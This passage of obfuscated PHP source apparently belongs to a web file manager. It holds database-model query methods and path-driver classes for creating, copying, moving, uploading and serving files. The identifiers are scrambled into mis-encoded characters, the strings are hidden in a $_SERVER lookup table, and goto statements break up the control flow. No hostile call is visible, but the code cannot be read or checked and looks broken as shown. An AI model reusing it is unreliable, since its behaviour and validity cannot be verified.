{ $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $fÜ×¹ĞŠ° =& $_SERVER[Î¿—”òá]; return isset($this->fields[$fÜ×¹ĞŠ°[239]]) ? $this->fields[$fÜ×¹ĞŠ°[239]] : $this->pk; } public function getDbFields() { $AÈ˜÷÷¸ìˆ =& $_SERVER[Î¿—”òá]; if (isset($this->options[$AÈ˜÷÷¸ìˆ[267]])) { $C™ÏÔÄˆÙ¤ = $this->db->getFields($this->options[$AÈ˜÷÷¸ìˆ[267]]); return $C™ÏÔÄˆÙ¤ ? array_keys($C™ÏÔÄˆÙ¤) : !1; } if ($this->fields) { $C™ÏÔÄˆÙ¤ = $this->fields; unset($C™ÏÔÄˆÙ¤[$AÈ˜÷÷¸ìˆ[238]], $C™ÏÔÄˆÙ¤[$AÈ˜÷÷¸ìˆ[239]], $C™ÏÔÄˆÙ¤[$AÈ˜÷÷¸ìˆ[240]], $C™ÏÔÄˆÙ¤[$AÈ˜÷÷¸ìˆ[237]]); return $C™ÏÔÄˆÙ¤; } return !1; } public function data($bÀáÒÄ •Å = '') { $fÒó½š†ŠÆ =& $_SERVER[Î¿—”òá]; if ($fÒó½š†ŠÆ[33] === $bÀáÒÄ •Å && !empty($this->data)) { return $this->data; } if (is_object($bÀáÒÄ •Å)) { $bÀáÒÄ •Å = get_object_vars($bÀáÒÄ •Å); } elseif (is_string($bÀáÒÄ •Å)) { parse_str($bÀáÒÄ •Å, $bÀáÒÄ •Å); } elseif (!is_array($bÀáÒÄ •Å)) { think_exception(think_lang($fÒó½š†ŠÆ[259])); } $this->data = $bÀáÒÄ •Å; return $this; } public function join($dßÃœìŒÆê) { $CöµÑ¶¹³ =& $_SERVER[Î¿—”òá]; if (is_array($dßÃœìŒÆê)) { $this->options[$CöµÑ¶¹³[270]] = $dßÃœìŒÆê; } elseif (!empty($dßÃœìŒÆê)) { $this->options[$CöµÑ¶¹³[270]][] = $dßÃœìŒÆê; } return $this; } public function union($C³Å½‚ˆ¯, $E Ğï ¦âá = false) { goto fß„½Êˆ¸Ğ; E´¿Ñğ¼Ô„: return $this; goto Fˆö¦Ûùª; aˆ¾áÓ¡êø: if (is_object($C³Å½‚ˆ¯)) { $C³Å½‚ˆ¯ = get_object_vars($C³Å½‚ˆ¯); } if (is_string($C³Å½‚ˆ¯)) { $eŞÔ…Ú×™Õ = $C³Å½‚ˆ¯; } elseif (is_array($C³Å½‚ˆ¯)) { if (isset($C³Å½‚ˆ¯[0])) { $this->options[$fˆéÔ²±Š[335]] = array_merge($this->options[$fˆéÔ²±Š[335]], $C³Å½‚ˆ¯); return $this; } else { $eŞÔ…Ú×™Õ = $C³Å½‚ˆ¯; } } else { think_exception(think_lang($fˆéÔ²±Š[259])); } $this->options[$fˆéÔ²±Š[335]][] = $eŞÔ…Ú×™Õ; goto E´¿Ñğ¼Ô„; fß„½Êˆ¸Ğ: $fˆéÔ²±Š =& $_SERVER[Î¿—”òá]; if (empty($C³Å½‚ˆ¯)) { return $this; } if ($E Ğï ¦âá) { $this->options[$fˆéÔ²±Š[335]][$fˆéÔ²±Š[336]] = !0; } goto aˆ¾áÓ¡êø; Fˆö¦Ûùª: } public function cache($D’¿ªÖâïÜ = true, $bÙÏˆøŒÒ = null, $cÂê¶»ÂšĞ = '') { $d±çÁƒèçÒ =& $_SERVER[Î¿—”òá]; if (!1 !== $D’¿ªÖâïÜ) { $this->options[$d±çÁƒèçÒ[337]] = array($d±çÁƒèçÒ[89] => $D’¿ªÖâïÜ, $d±çÁƒèçÒ[327] => $bÙÏˆøŒÒ, $d±çÁƒèçÒ[29] => $cÂê¶»ÂšĞ); } return $this; } public function field($a“Î‘ìÈ’Â, $bäè„Ÿ¬ƒ® = false) { $báÓÄ…¡‡ =& $_SERVER[Î¿—”òá]; if (!0 === $a“Î‘ìÈ’Â) { $d¼ÅçÕ¡îæ = $this->getDbFields(); $a“Î‘ìÈ’Â = $d¼ÅçÕ¡îæ ? $d¼ÅçÕ¡îæ : $báÓÄ…¡‡[176]; } elseif ($bäè„Ÿ¬ƒ®) { if (is_string($a“Î‘ìÈ’Â)) { $a“Î‘ìÈ’Â = explode($báÓÄ…¡‡[47], $a“Î‘ìÈ’Â); } $d¼ÅçÕ¡îæ = $this->getDbFields(); $a“Î‘ìÈ’Â = $d¼ÅçÕ¡îæ ? array_diff($d¼ÅçÕ¡îæ, $a“Î‘ìÈ’Â) : $a“Î‘ìÈ’Â; } $this->options[$báÓÄ…¡‡[261]] = $a“Î‘ìÈ’Â; return $this; } public function scope($B“†÷¡İ = '', $eàŠŒó¬Ë› = NULL) { $bŞÁä’àèÙ =& $_SERVER[Î¿—”òá]; if ($bŞÁä’àèÙ[33] === $B“†÷¡İ) { if (isset($this->_scope[$bŞÁä’àèÙ[34]])) { $b§˜Û±ˆ¸— = $this->_scope[$bŞÁä’àèÙ[34]]; } else { return $this; } } elseif (is_string($B“†÷¡İ)) { $eóÔ¤¤é©æ = explode($bŞÁä’àèÙ[47], $B“†÷¡İ); $b§˜Û±ˆ¸— = array(); foreach ($eóÔ¤¤é©æ as $D©î”öä¤) { if (!isset($this->_scope[$D©î”öä¤])) { continue; } $b§˜Û±ˆ¸— = array_merge($b§˜Û±ˆ¸—, $this->_scope[$D©î”öä¤]); } if (!empty($eàŠŒó¬Ë›) && is_array($eàŠŒó¬Ë›)) { $b§˜Û±ˆ¸— = array_merge($b§˜Û±ˆ¸—, $eàŠŒó¬Ë›); } } elseif (is_array($B“†÷¡İ)) { $b§˜Û±ˆ¸— = $B“†÷¡İ; } if (is_array($b§˜Û±ˆ¸—) && !empty($b§˜Û±ˆ¸—)) { $this->options = array_merge($this->options, array_change_key_case($b§˜Û±ˆ¸—)); } return $this; } public function where($AÁÌÎÕˆÌ÷, $b¬·ìõÅ“ = null) { $dĞÈ¢òÚÙ‡ =& $_SERVER[Î¿—”òá]; if (!is_null($b¬·ìõÅ“) && is_string($AÁÌÎÕˆÌ÷)) { if (!is_array($b¬·ìõÅ“)) { $b¬·ìõÅ“ = func_get_args(); array_shift($b¬·ìõÅ“); } $b¬·ìõÅ“ = array_map(array($this->db, $dĞÈ¢òÚÙ‡[331]), $b¬·ìõÅ“); $AÁÌÎÕˆÌ÷ = vsprintf($AÁÌÎÕˆÌ÷, $b¬·ìõÅ“); } elseif (is_object($AÁÌÎÕˆÌ÷)) { $AÁÌÎÕˆÌ÷ = get_object_vars($AÁÌÎÕˆÌ÷); } elseif (is_array($AÁÌÎÕˆÌ÷)) { foreach ($AÁÌÎÕˆÌ÷ as $F ô†ŞÌ·¢ => $DÅ¾ˆÁ¢µ) { if ((is_numeric($F ô†ŞÌ·¢) || !$F ô†ŞÌ·¢) && is_string($DÅ¾ˆÁ¢µ)) { think_trace($dĞÈ¢òÚÙ‡[338], $dĞÈ¢òÚÙ‡[33], $dĞÈ¢òÚÙ‡[46]); die; } } } if (is_string($AÁÌÎÕˆÌ÷) && $dĞÈ¢òÚÙ‡[33] != $AÁÌÎÕˆÌ÷) { $f÷ö–ëéíğ = array(); $f÷ö–ëéíğ[$dĞÈ¢òÚÙ‡[339]] = $AÁÌÎÕˆÌ÷; $AÁÌÎÕˆÌ÷ = $f÷ö–ëéíğ; } if (isset($this->options[$dĞÈ¢òÚÙ‡[263]])) { $this->options[$dĞÈ¢òÚÙ‡[263]] = array_merge($this->options[$dĞÈ¢òÚÙ‡[263]], $AÁÌÎÕˆÌ÷); } else { $this->options[$dĞÈ¢òÚÙ‡[263]] = $AÁÌÎÕˆÌ÷; } return $this; } public function limit($e¼±™ Ò¾Ü, $cÑ…°Šöåƒ = null) { $A¾Ø±Å›Ç =& $_SERVER[Î¿—”òá]; $this->options[$A¾Ø±Å›Ç[280]] = is_null($cÑ…°Šöåƒ) ? $e¼±™ Ò¾Ü : $e¼±™ Ò¾Ü . $A¾Ø±Å›Ç[47] . $cÑ…°Šöåƒ; return $this; } public function page($b†“óášÒº, $aïäŒÎ¼÷ = null) { $aÆ¤ïƒŒÇ =& $_SERVER[Î¿—”òá]; $this->options[$aÆ¤ïƒŒÇ[340]] = is_null($aïäŒÎ¼÷) ? $b†“óášÒº : $b†“óášÒº . $aÆ¤ïƒŒÇ[47] . $aïäŒÎ¼÷; return $this; } public function comment($D³ã¥°œà) { $this->options[$_SERVER[Î¿—”òá][341]] = $D³ã¥°œà; return $this; } public function setProperty($b×‡“ç¢, $EÂáß¬ù´É) { if (property_exists($this, $b×‡“ç¢)) { $this->{$b×‡“ç¢} = $EÂáß¬ù´É; } return $this; } } goto dÜâ¬¬Á¤æ; bìÓ×È´‹: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($AìÖ«˜ê¸ò) { $this->pathParse = $AìÖ«˜ê¸ò; $this->model = Model($_SERVER[Î¿—”òá][1110]); } public function getPath($B›¤™¿Ç¡) { return trim($B›¤™¿Ç¡, $_SERVER[Î¿—”òá][8]); } public function pathFather($Bƒ½µàœ™‡) { $AÊ˜âæ­ßŠ = $this->parse($Bƒ½µàœ™‡); $AÊ˜âæ­ßŠ = $this->infoSimple($Bƒ½µàœ™‡); return $AÊ˜âæ­ßŠ ? $AÊ˜âæ­ßŠ[$_SERVER[Î¿—”òá][461]] : !1; } public function getPathName($Eî±òÄ·Û‘) { $fÓºÛŠ¡“ = $this->infoSimple($Eî±òÄ·Û‘); return $fÓºÛŠ¡“ ? $fÓºÛŠ¡“[$_SERVER[Î¿—”òá][28]] : !1; } public function getPathOuter($E¸‘™ä½Š) { if (!$E¸‘™ä½Š) { return $E¸‘™ä½Š; } $dÁò”åÄè = $this->parse($E¸‘™ä½Š); return KodIO::make($dÁò”åÄè[$_SERVER[Î¿—”òá][367]]); } public function copyFolderFromIO($bŒÖ‹ÙØÉ·, $c…¤ˆ“Ê‚¶, $e•“†»Òš¥, $Dƒğ¡øµƒ™, $c‹£É´µ†) { $AØ‚³©ÖÚ = $this->model->copyFolderFromIO($bŒÖ‹ÙØÉ·, $c…¤ˆ“Ê‚¶, $e•“†»Òš¥, $Dƒğ¡øµƒ™, $c‹£É´µ†); return KodIO::make($AØ‚³©ÖÚ); } public function isParentOf($C…ñ˜Õ’ó£, $béÙŒØÓÅ) { return $this->model->isParentOf($C…ñ˜Õ’ó£, $béÙŒØÓÅ); } public function mkfile($fÉÍ—©ß á, $e¾ğíÇ×Î = '', $F°çİÂœ‹ = REPEAT_RENAME) { $fˆ‘âùçé =& $_SERVER[Î¿—”òá]; $b§ÁŠç›ğ— = $this->parse($fÉÍ—©ß á); $fÉÍ—©ß á = $b§ÁŠç›ğ—[$fˆ‘âùçé[367]]; for ($E¬Ù»ŸÛ = 0; $E¬Ù»ŸÛ < count($b§ÁŠç›ğ—[$fˆ‘âùçé[1111]]); $E¬Ù»ŸÛ++) { $aŠñÎß·ç‹ = $b§ÁŠç›ğ—[$fˆ‘âùçé[1111]][$E¬Ù»ŸÛ]; if ($E¬Ù»ŸÛ == count($b§ÁŠç›ğ—[$fˆ‘âùçé[1111]]) - 1) { $fÉÍ—©ß á = $this->model->mkfile($fÉÍ—©ß á, $aŠñÎß·ç‹, $e¾ğíÇ×Î, $F°çİÂœ‹); break; } $fÉÍ—©ß á = $this->model->mkdir($fÉÍ—©ß á, $aŠñÎß·ç‹, REPEAT_SKIP); } return $this->getPathOuter($fÉÍ—©ß á); } public function mkdir($B“™Êïâ®‡, $e¢Éºó«ß = REPEAT_SKIP) { $B¦”è¦¾® =& $_SERVER[Î¿—”òá]; $dÏ÷»×²İò = $this->parse($B“™Êïâ®‡); $B“™Êïâ®‡ = $dÏ÷»×²İò[$B¦”è¦¾®[367]]; for ($E‘è®‹åÏ× = 0; $E‘è®‹åÏ× < count($dÏ÷»×²İò[$B¦”è¦¾®[1111]]); $E‘è®‹åÏ×++) { $A°²’ğà˜Ø = $dÏ÷»×²İò[$B¦”è¦¾®[1111]][$E‘è®‹åÏ×]; $B“™Êïâ®‡ = $this->model->mkdir($B“™Êïâ®‡, $A°²’ğà˜Ø, $e¢Éºó«ß); } return $this->getPathOuter($B“™Êïâ®‡); } public function copyFile($F‚ñŞÓäÜ¦, $f¼»èøŠõ, $eÀ‘­Í›ù‰ = REPEAT_REPLACE) { $e‡”ŒæÜ =& $_SERVER[Î¿—”òá]; $a™×š´‡‡å = $this->parse($f¼»èøŠõ); $Fšïœîó‰™ = $this->model->copy($F‚ñŞÓäÜ¦, $a™×š´‡‡å[$e‡”ŒæÜ[367]], $eÀ‘­Í›ù‰, $a™×š´‡‡å[$e‡”ŒæÜ[75]]); return $Fšïœîó‰™ ? $this->getPathOuter($Fšïœîó‰™) : !1; } public function moveFile($b’×¾Û¨ğ“, $CË†‘‚ä‡±, $cÑŸö„¿…í = REPEAT_REPLACE) { $C÷¬ÇÚ¡¯ö =& $_SERVER[Î¿—”òá]; $có†Ô’ôœÔ = $this->parse($CË†‘‚ä‡±); $EÒ½¬¶é‡Û = $this->model->move($b’×¾Û¨ğ“, $có†Ô’ôœÔ[$C÷¬ÇÚ¡¯ö[367]], $cÑŸö„¿…í, $có†Ô’ôœÔ[$C÷¬ÇÚ¡¯ö[75]]); return $EÒ½¬¶é‡Û ? $this->getPathOuter($EÒ½¬¶é‡Û) : !1; } public function copy($fœÍ£®‰Ù, $F³î“¢ƒÒˆ, $f‹ÚõèŒŒ = REPEAT_REPLACE) { $Cä£¦ÌÁ = $this->parse($F³î“¢ƒÒˆ); $Eˆš‡õŒ© = $this->model->copy($fœÍ£®‰Ù, $Cä£¦ÌÁ[$_SERVER[Î¿—”òá][367]], $f‹ÚõèŒŒ); return $Eˆš‡õŒ© ? $this->getPathOuter($Eˆš‡õŒ©) : !1; } public function moveSameAllow() { } public function move($aˆ‹¾„‘–, $AÇØî´’î”, $b¹ÅôµÍÚĞ = REPEAT_REPLACE) { $A÷‘ Ë Áî = $this->parse($AÇØî´’î”); $d•×êµõ² = $this->model->move($aˆ‹¾„‘–, $A÷‘ Ë Áî[$_SERVER[Î¿—”òá][367]], $b¹ÅôµÍÚĞ); return $d•×êµõ² ? $this->getPathOuter($d•×êµõ²) : !1; } public function remove($C¨„ÛÚ¬Ş, $CÓÊÓ„¶“ = true) { return $this->model->remove($C¨„ÛÚ¬Ş, $CÓÊÓ„¶“); } public function rename($eÌô¬ƒîÂ, $a³™ø‚¯º†) { $Fãê†›¤±å = $this->model->rename($eÌô¬ƒîÂ, $a³™ø‚¯º†); return $Fãê†›¤±å ? $this->getPathOuter($eÌô¬ƒîÂ) : $Fãê†›¤±å; } public function size($c‰±ùºĞŒÜ) { $c»¯¡Ğ…Ğ = $this->infoSimple($c‰±ùºĞŒÜ); return $c»¯¡Ğ…Ğ ? $c»¯¡Ğ…Ğ[$_SERVER[Î¿—”òá][77]] : 0; } public function infoSimple($F‰ŒôÎ¨¥Ô) { return $this->model->sourceInfo($F‰ŒôÎ¨¥Ô); } public function info($F‰Æ°°„’„) { return $this->infoParse($F‰Æ°°„’„); } public function infoAuth($e›¬¡©øİæ) { return $this->infoParse($e›¬¡©øİæ, !1, !0); } public function infoWithChildren($cİ×ô£¶¶²) { return $this->infoParse($cİ×ô£¶¶², !0); } protected function infoParse($c¿İæ«ùäØ, $f˜Ÿğ˜Ú¶‘ = false, $EªÀæ±±Ó¯ = false) { if (!$f˜Ÿğ˜Ú¶‘) { return $this->model->pathInfo($c¿İæ«ùäØ, $EªÀæ±±Ó¯); } return $this->model->pathInfoMore($c¿İæ«ùäØ); } public function infoFull($E¬¥êˆó) { $D†»ªòâö— =& $_SERVER[Î¿—”òá]; $Eò©éî¤Æ = explode($D†»ªòâö—[8], $E¬¥êˆó); $CÆˆÌì¶ó = implode($D†»ªòâö—[8], array_splice($Eò©éî¤Æ, 1)); return $this->model->pathInfoByPath($Eò©éî¤Æ[0], $CÆˆÌì¶ó); } public function hashSimple($e±Œ»Î­ßæ) { $fùâÕíêÏÇ =& $_SERVER[Î¿—”òá]; $D¢ÓöøÛÓ = $this->infoWithChildren($e±Œ»Î­ßæ); return $D¢ÓöøÛÓ[$fùâÕíêÏÇ[162]][$fùâÕíêÏÇ[164]]; } public function hashMd5($d¹ ƒ”ù) { $BÇºÃ‘„œß =& $_SERVER[Î¿—”òá]; $Fò”‘ í¸Ñ = $this->infoWithChildren($d¹ ƒ”ù); return $Fò”‘ í¸Ñ[$BÇºÃ‘„œß[162]][$BÇºÃ‘„œß[163]]; } public function exist($b±ÂÒÛ†Œ) { $FÃíê÷ÃŠ =& $_SERVER[Î¿—”òá]; $Fë¢«Ñò‹ê = $this->parse($b±ÂÒÛ†Œ); if (!$Fë¢«Ñò‹ê[$FÃíê÷ÃŠ[75]]) { return $this->isFile($b±ÂÒÛ†Œ) || $this->isFolder($b±ÂÒÛ†Œ); } $AëÎŠ‰…ÏŠ = array($FÃíê÷ÃŠ[368] => $Fë¢«Ñò‹ê[$FÃíê÷ÃŠ[367]], $FÃíê÷ÃŠ[28] => $Fë¢«Ñò‹ê[$FÃíê÷ÃŠ[75]]); $f—ËãÜ»¡ñ = $this->model->where($AëÎŠ‰…ÏŠ)->find(); return $f—ËãÜ»¡ñ ? !0 : !1; } public function isFile($b•Ñ¾‰Áï) { $EÕÄæ†Ç¢  =& $_SERVER[Î¿—”òá]; $FšÓÒìÎ×± = $this->infoSimple($b•Ñ¾‰Áï); return $FšÓÒìÎ×± && $FšÓÒìÎ×±[$EÕÄæ†Ç¢ [370]] == $EÕÄæ†Ç¢ [83] ? !1 : !0; } public function isFolder($aÑß¶ê¿ğˆ) { $eÎÂ¿ =& $_SERVER[Î¿—”òá]; $a²³İßÄÙô = $this->infoSimple($aÑß¶ê¿ğˆ); return $a²³İßÄÙô && $a²³İßÄÙô[$eÎÂ¿[370]] == $eÎÂ¿[83] ? !0 : !1; } public function listPath($eÂŞ³À’äÀ, $cœÍ‚…ŒÎ = false) { $B²®ßùçÍ =& $_SERVER[Î¿—”òá]; if ($eÂŞ³À’äÀ == $B²®ßùçÍ[33]) { return !1; } $A„ª†ğÎ³™ = array($B²®ßùçÍ[368] => $eÂŞ³À’äÀ); if ($cœÍ‚…ŒÎ) { return $this->model->listSource($A„ª†ğÎ³™, -1); } return $this->model->listSource($A„ª†ğÎ³™); } public function has($F†òØ‹ª‘, $C¿Ï‚ªî²Ò = false, $EÍ¶á¯ôÈ = null) { $f•ì†£‡÷Ò =& $_SERVER[Î¿—”òá]; $a¥ôğ—õ = $this->infoWithChildren($F†òØ‹ª‘); if ($C¿Ï‚ªî²Ò) { return array($f•ì†£‡÷Ò[192] => $a¥ôğ—õ[$f•ì†£‡÷Ò[192]], $f•ì†£‡÷Ò[191] => $a¥ôğ—õ[$f•ì†£‡÷Ò[191]]); } return $EÍ¶á¯ôÈ ? $a¥ôğ—õ[$f•ì†£‡÷Ò[192]] : $a¥ôğ—õ[$f•ì†£‡÷Ò[191]]; } public function listAll($EÊÌÆÔêŸ) { $FŸé¼×‡¯ = IO::info($this->pathParse[$_SERVER[Î¿—”òá][75]]); if (!$FŸé¼×‡¯) { return array(); } return $this->model->listAll($EÊÌÆÔêŸ); } public function getContent($c«Ğ—Æ¼†œ) { return $this->model->getContent($c«Ğ—Æ¼†œ); } public function setContent($bÃ‹ ‹†ùÈ, $B‚¼¨Í”Îµ = '') { return $this->model->setContent($bÃ‹ ‹†ùÈ, $B‚¼¨Í”Îµ); } public function fileSubstr($bÀÓëñšÅ‡, $a™Û¯×‚Ô¥, $Eæ’Ê§å) { return $this->model->fileSubstr($bÀÓëñšÅ‡, $a™Û¯×‚Ô¥, $Eæ’Ê§å); } public function download($DÖğ¬ô†·, $B¶¶äïÎ¼Ù = '') { $eĞßŒò„­œ = get_path_father($B¶¶äïÎ¼Ù); $D×»Òê = get_path_this($B¶¶äïÎ¼Ù); $fÛ‚Ö·Ç‘¡ = $this->model->fileInfoGet($DÖğ¬ô†·); $fÊ‡†ÎÃêÒ = IO::copy($fÛ‚Ö·Ç‘¡[$_SERVER[Î¿—”òá][75]], $eĞßŒò„­œ, !1, $D×»Òê); return $fÊ‡†ÎÃêÒ; } public function setModifyTime($dÏÇšßëÏ, $BŞÖñÆˆµ› = '') { $this->model->metaSet($dÏÇšßëÏ, $_SERVER[Î¿—”òá][1112], $BŞÖñÆˆµ›); } public function upload($bË…Çí…¡·, $AÏÖ¦¾Ö¦á, $E‰…‰µ·¶î = false, $c‚Îğíˆ‰ß = REPEAT_REPLACE) { $EÕ—ŠÜ¬Ø =& $_SERVER[Î¿—”òá]; $B²¹ÕÎé° = $this->parse($bË…Çí…¡·); $C¾ÇÛ™£‘Ï = $this->model->addFile($B²¹ÕÎé°[$EÕ—ŠÜ¬Ø[367]], $AÏÖ¦¾Ö¦á, $B²¹ÕÎé°[$EÕ—ŠÜ¬Ø[75]], $E‰…‰µ·¶î, $c‚Îğíˆ‰ß); return $this->getPathOuter($C¾ÇÛ™£‘Ï); } public function uploadFileByID($CâÍˆÄÇ”œ, $fÊÒ¸­„Íå, $DáÜòÛ¯²ª) { $fª«“Ú‰Êª =& $_SERVER[Î¿—”òá]; $CíöšÉºÊ = $this->parse($CâÍˆÄÇ”œ); $c¸»ŠÕ™¹Õ = $this->model->addFileByFileID($CíöšÉºÊ[$fª«“Ú‰Êª[367]], $fÊÒ¸­„Íå, $CíöšÉºÊ[$fª«“Ú‰Êª[75]], $DáÜòÛ¯²ª); return $this->getPathOuter($c¸»ŠÕ™¹Õ); } public function addFileByRemote($eÇ´¸ë±ì‰, $F“ŒÙÄÉÖ†, $aôëê„Ûªè = array(), $b£ÄÛƒ¡Üœ = '', $F“¾•Ã ø²) { $FÈ¤Í‘ù‹ =& $_SERVER[Î¿—”òá]; $Dà­ï®Î§ê = $this->parse($eÇ´¸ë±ì‰); $b£ÄÛƒ¡Üœ = empty($b£ÄÛƒ¡Üœ) ? $Dà­ï®Î§ê[$FÈ¤Í‘ù‹[75]] : $b£ÄÛƒ¡Üœ; $Dòõ„˜Ô† = $this->model->addFileByRemote($Dà­ï®Î§ê[$FÈ¤Í‘ù‹[367]], $F“ŒÙÄÉÖ†, $b£ÄÛƒ¡Üœ, $aôëê„Ûªè, $F“¾•Ã ø²); return $this->getPathOuter($Dòõ„˜Ô†); } public function uploadLink($F­¦¤ã‡Îé, $B»Ğàï¯¥â = 0) { $f¨­ÑÙ¢ë =& $_SERVER[Î¿—”òá]; $Aéà­Î°¬¤ = $this->parse($F­¦¤ã‡Îé); $F­¦¤ã‡Îé = Model($f¨­ÑÙ¢ë[544])->createFileName($Aéà­Î°¬¤[$f¨­ÑÙ¢ë[75]]); $d¡Ş°–—Ï’ = IO::uploadLink($F­¦¤ã‡Îé, $B»Ğàï¯¥â); return $d¡Ş°–—Ï’; } public function fileNameAuto($Cë™ëŠ‘ë, $bÌîàİãÑØ, $fœß›§‘Ë = REPEAT_REPLACE, $Eˆì…«‰õ„ = false) { return $this->model->fileNameAuto($Cë™ëŠ‘ë, $bÌîàİãÑØ, $fœß›§‘Ë, $Eˆì…«‰õ„); } public function fileNameExist($eºá½¸İºĞ, $fìŒ™Œˆö) { return $this->model->fileNameExist($eºá½¸İºĞ, $fìŒ™Œˆö); } protected function _fileOut($FÚ¤ãÎ™‡¢, $e“‰ƒĞ…·“ = false, $AÀ­©’ƒ§ò = false, $Eïç¦ìÖˆ = '', $d–ÏÙ³ÅÉ = false) { goto DŠÈÇŞ¼è; DŠÈÇŞ¼è: $eÒØ»½´¾ =& $_SERVER[Î¿—”òá]; $cØÖ„¸’½ = $this->model->sourceInfo($FÚ¤ãÎ™‡¢); if ($cØÖ„¸’½[$eÒØ»½´¾[370]] == $eÒØ»½´¾[83]) { header($eÒØ»½´¾[1113]); die; } goto c›Îµ­äîÈ; eóñ¹­™µ: if ($d–ÏÙ³ÅÉ) { return IO::fileOutServer($dÖİÕ¬à¾¦[$eÒØ»½´¾[75]], $e“‰ƒĞ…·“, $AÃÅß©ÓªÇ, $Eïç¦ìÖˆ); } IO::fileOut($dÖİÕ¬à¾¦[$eÒØ»½´¾[75]], $e“‰ƒĞ…·“, $AÃÅß©ÓªÇ, $Eïç¦ìÖˆ); goto d—¹Ë„ã©; c›Îµ­äîÈ: $dÖİÕ¬à¾¦ = $this->model->fileInfoGet($FÚ¤ãÎ™‡¢); $Eïç¦ìÖˆ = $dÖİÕ¬à¾¦[$eÒØ»½´¾[163]] ? $dÖİÕ¬à¾¦[$eÒØ»½´¾[163]] : $Eïç¦ìÖˆ; $AÃÅß©ÓªÇ = isset($GLOBALS[$eÒØ»½´¾[1114]]) ? $GLOBALS[$eÒØ»½´¾[1114]] : $cØÖ„¸’½[$eÒØ»½´¾[28]]; goto eóñ¹­™µ; d—¹Ë„ã©: } public function fileOut($aÏ“ÀåŒ¦¢, $A«Ñì‡°øé = false, $DÚÎ»äœå = false, $c³ª¢Ñ·²© = '') { $this->_fileOut($aÏ“ÀåŒ¦¢, $A«Ñì‡°øé, $DÚÎ»äœå, $c³ª¢Ñ·²©); } public function fileOutServer($dŠä ğĞ¢, $cŠíšÖ„® = false, $Eæİ©…¾Öê = false, $bŸ˜•â‚Óİ = '') { $this->_fileOut($dŠä ğĞ¢, $cŠíšÖ„®, $Eæİ©…¾Öê, $bŸ˜•â‚Óİ, !0); } protected function _fileOutImage($e™ƒÆ£ë¶¯, $dÁœÉ»ÅĞ™ = 250) { $a¥…ƒñË” =& $_SERVER[Î¿—”òá]; $a®°âœä = $this->model->sourceInfo($e™ƒÆ£ë¶¯); if ($a®°âœä[$a¥…ƒñË”[370]] == $a¥…ƒñË”[83]) { show_json($a¥…ƒñË”[1115] . $e™ƒÆ£ë¶¯, !1); } $GLOBALS[$a¥…ƒñË”[1114]] = $a®°âœä[$a¥…ƒñË”[28]]; $c—”áàô¬º = $this->model->fileInfoGet($e™ƒÆ£ë¶¯); IO::fileOutImage($c—”áàô¬º[$a¥…ƒñË”[75]], $dÁœÉ»ÅĞ™); } public function fileOutImage($eøì‹¤ñá, $B¶Œ¹Œ‡”¿ = 250) { $this->_fileOutImage($eøì‹¤ñá, $B¶Œ¹Œ‡”¿); } public function fileOutImageServer($F¦»£Š¸öÕ, $Eˆ‘‰¹¦Ë› = 250) { $this->_fileOutImage($F¦»£Š¸öÕ, $Eˆ‘‰¹¦Ë›); } public function link($b¬ÜÁáå‚¼, $Fäš¡•ÎÂ” = '') { $DÜ†—‚«ƒí = $this->model->fileInfoGet($b¬ÜÁáå‚¼); return IO::link($DÜ†—‚«ƒí[$_SERVER[Î¿—”òá][75]], $Fäš¡•ÎÂ”); } protected function parse($a”Å—¾‹Íˆ) { $CˆÉ†ßŒ²š =& $_SERVER[Î¿—”òá]; if (strstr($a”Å—¾‹Íˆ, $CˆÉ†ßŒ²š[8]) === !1) { return array($CˆÉ†ßŒ²š[385] => intval($a”Å—¾‹Íˆ), $CˆÉ†ßŒ²š[75] => $CˆÉ†ßŒ²š[33], $CˆÉ†ßŒ²š[1111] => array()); } $có‚ƒ«ÍìŠ = explode($CˆÉ†ßŒ²š[8], trim($a”Å—¾‹Íˆ, $CˆÉ†ßŒ²š[8])); if (count($có‚ƒ«ÍìŠ) < 2) { show_tips($a”Å—¾‹Íˆ . $CˆÉ†ßŒ²š[1116]); } return array($CˆÉ†ßŒ²š[385] => intval($có‚ƒ«ÍìŠ[0]), $CˆÉ†ßŒ²š[75] => $có‚ƒ«ÍìŠ[1], $CˆÉ†ßŒ²š[1111] => array_slice($có‚ƒ«ÍìŠ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($C×÷ãĞÏˆÆ) { $this->pathParse = $C×÷ãĞÏˆÆ; $this->model = Model($_SERVER[Î¿—”òá][1110]); } public function getPathOuter($cóÜ›ƒ½ƒâ) { $Dñ¡†äÛ¬ë =& $_SERVER[Î¿—”òá]; if (!$cóÜ›ƒ½ƒâ) { return $cóÜ›ƒ½ƒâ; } $EøšªÅÔçî = $this->parse($cóÜ›ƒ½ƒâ); return trim(KodIO::makeShare($this->pathParse[$Dñ¡†äÛ¬ë[367]], $EøšªÅÔçî[$Dñ¡†äÛ¬ë[367]]), $Dñ¡†äÛ¬ë[8]); } protected function infoParse($dÈ¿ĞÏšèÛ, $a¦ÒÉÜˆÇ = false, $B¢ÓöÔ½æ… = false) { $A•æ‡Ãš‰İ =& $_SERVER[Î¿—”òá]; $AŠ¯Õâ‹ = $this->pathParse[$A•æ‡Ãš‰İ[367]]; $DÊé†ºµ‡ = trim($this->pathParse[$A•æ‡Ãš‰İ[1005]], $A•æ‡Ãš‰İ[8]); return Action($A•æ‡Ãš‰İ[1117])->sharePathInfo($AŠ¯Õâ‹, $DÊé†ºµ‡); } public function infoFull($DßÑ‹Ğ÷ì) { $cÏÇ†á›¬¼ =& $_SERVER[Î¿—”òá]; $B¥ÊİØ¾ = explode($cÏÇ†á›¬¼[8], trim($DßÑ‹Ğ÷ì, $cÏÇ†á›¬¼[8])); if (count($B¥ÊİØ¾) > 1) { $fÌßÉ¡£ø = implode($cÏÇ†á›¬¼[8], array_splice($B¥ÊİØ¾, 1)); $dôâ¡˜Ö¿õ = $this->model->pathInfoByPath($B¥ÊİØ¾[0], $fÌßÉ¡£ø); if (!$dôâ¡˜Ö¿õ) { return !1; } $this->pathParse[$cÏÇ†á›¬¼[1005]] = $dôâ¡˜Ö¿õ[$cÏÇ†á›¬¼[369]]; } return $this->infoParse($DßÑ‹Ğ÷ì); } public function listAll($c‘ƒ¹ÃÖÕë) { goto D–»ÁÊ×°õ; 